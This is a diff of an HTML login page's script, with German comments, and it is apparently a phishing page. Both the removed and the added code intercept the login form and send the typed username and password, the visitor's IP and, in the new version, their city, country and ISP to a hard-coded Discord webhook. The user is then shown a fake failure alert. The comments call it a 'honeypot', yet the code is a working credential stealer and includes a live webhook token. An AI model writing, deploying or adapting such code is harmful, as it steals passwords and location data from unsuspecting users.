@@ -106,100 +106,105 @@
     </footer>
 
     <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        
-        const loader = document.getElementById('loader-wrapper');
-        const ipInfoElement = document.getElementById('ip-info');
-        const loginForm = document.getElementById('login-form');
-        
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1445876618458300558/b2T4ZyYWCNCXIEZApJltktwbAmmgE1asljZ5LJqUH1nApZ0Y3z_2e7nDxkZqHqK9JPA1";
+        document.addEventListener('DOMContentLoaded', function() {
+            
+            const loader = document.getElementById('loader-wrapper');
+            const ipInfoElement = document.getElementById('ip-info');
+            const loginForm = document.getElementById('login-form');
+            
 
-        let currentIp = 'Unbekannt';
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1445876618458300558/b2T4ZyYWCNCXIEZApJltktwbAmmgE1asljZ5LJqUH1nApZ0Y3z_2e7nDxkZqHqK9JPA1";
 
-        // 1. IP abrufen
-        fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                if (!response.ok) throw new Error('Netzwerkfehler');
-                return response.json();
-            })
-            .then(data => {
-                currentIp = data.ip;
-                ipInfoElement.textContent = 'Your IP: ' + data.ip;
-            })
-            .catch(error => {
-                console.error('IP Fehler:', error);
-                ipInfoElement.textContent = 'Connection verify failed.';
-            })
-            .finally(() => {
-                loader.style.display = 'none';
-            });
-
-        // 2. Login abfangen und an Discord senden
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); // Kein Neuladen der Seite
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // Wir bauen die Nachricht für Discord
-            // "embeds" sorgt für eine hübsche Formatierung im Chat
-            const payload = {
-                username: "Security Bot", // Name des Bots im Chat
-                avatar_url: "https://i.imgur.com/4M34hi2.png", // Optional: Ein Icon
-                embeds: [
-                    {
-                        title: "🚨 Neuer Login-Versuch!",
-                        color: 16711680, // Rot (Hex Code in Dezimal)
-                        fields: [
-                            {
-                                name: "IP Adresse",
-                                value: currentIp,
-                                inline: true
-                            },
-                            {
-                                name: "Username",
-                                value: username,
-                                inline: true
-                            },
-                            {
-                                name: "Password",
-                                value: password, // Hier sehen wir das Passwort
-                                inline: false
-                            },
-                            {
-                                name: "Zeitpunkt",
-                                value: new Date().toLocaleString('de-DE'),
-                                inline: false
-                            }
-                        ],
-                        footer: {
-                            text: "Honeypot Log System"
-                        }
-                    }
-                ]
+            // Wir speichern hier alle Infos über den Nutzer
+            let userInfo = {
+                ip: 'Unbekannt',
+                city: 'Unbekannt',
+                country: 'Unbekannt',
+                org: 'Unbekannt' // Der Internetanbieter
             };
 
-            // Senden an Discord
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("Verbindung fehlgeschlagen. (Fake Meldung für den User)");
-                    console.log("Log an Discord gesendet!");
-                } else {
-                    console.error("Fehler beim Senden an Discord");
-                }
-            })
-            .catch(error => {
-                console.error('Fehler:', error);
+            // 1. IP UND Standort abrufen (Wir nutzen jetzt ipapi.co statt ipify)
+            fetch('https://ipapi.co/json/')
+                .then(response => {
+                    if (!response.ok) throw new Error('Netzwerkfehler');
+                    return response.json();
+                })
+                .then(data => {
+                    // Daten speichern
+                    userInfo.ip = data.ip;
+                    userInfo.city = data.city;
+                    userInfo.country = data.country_name;
+                    userInfo.org = data.org;
+
+                    // Anzeige im Frontend aktualisieren
+                    ipInfoElement.textContent = `Connected from: ${data.city}, ${data.country_name} (${data.ip})`;
+                })
+                .catch(error => {
+                    console.error('Geo-Location Fehler:', error);
+                    ipInfoElement.textContent = 'Connection verify failed (Location unknown).';
+                })
+                .finally(() => {
+                    loader.style.display = 'none';
+                });
+
+            // 2. Login abfangen und an Discord senden
+            loginForm.addEventListener('submit', function(event) {
+                event.preventDefault(); 
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // Nachricht für Discord vorbereiten
+                const payload = {
+                    username: "Honeypot Wächter",
+                    avatar_url: "https://i.imgur.com/4M34hi2.png",
+                    embeds: [
+                        {
+                            title: "🚨 Zugriff erkannt!",
+                            description: "Jemand hat versucht sich einzuloggen.",
+                            color: 15158332, // Ein warnendes Rot
+                            fields: [
+                                {
+                                    name: "👤 User Input",
+                                    value: `**User:** \`${username}\`\n**Pass:** \`${password}\``,
+                                    inline: false
+                                },
+                                {
+                                    name: "🌍 Standort (Geschätzt)",
+                                    value: `${userInfo.city}, ${userInfo.country}`,
+                                    inline: true
+                                },
+                                {
+                                    name: "📡 Netzwerk / IP",
+                                    value: `${userInfo.ip}\n(${userInfo.org})`,
+                                    inline: true
+                                }
+                            ],
+                            footer: {
+                                text: "Jan Kirschke Security System"
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                };
+
+                // Senden an Discord
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Wir simulieren einen fehlgeschlagenen Login für den User
+                        alert(`${userInfo.ip}\n(${userInfo.org})`);
+                        // Optional: Formular leeren
+                        loginForm.reset();
+                    }
+                })
+                .catch(err => console.error(err));
             });
         });
-    });
     </script>
 </body>
 </html>
